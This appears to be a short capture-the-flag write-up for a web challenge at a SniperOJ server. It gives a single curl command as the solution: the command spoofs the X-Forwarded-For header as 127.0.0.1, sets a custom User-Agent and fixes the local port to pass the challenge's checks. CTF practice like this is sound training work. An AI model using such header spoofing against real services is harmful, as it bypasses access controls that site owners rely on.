#### Goals
 * Try to find the flag

#### Server Address
 * http://web.sniperoj.com:10006/

#### Solution
```
curl http://127.0.0.1/ \
    --header 'X-Forwarded-For:127.0.0.1' \
    --header 'User-Agent:SniperOJ-Web-Broswer' \
    --local-port 23333
```

#### Other Solutions
 * 
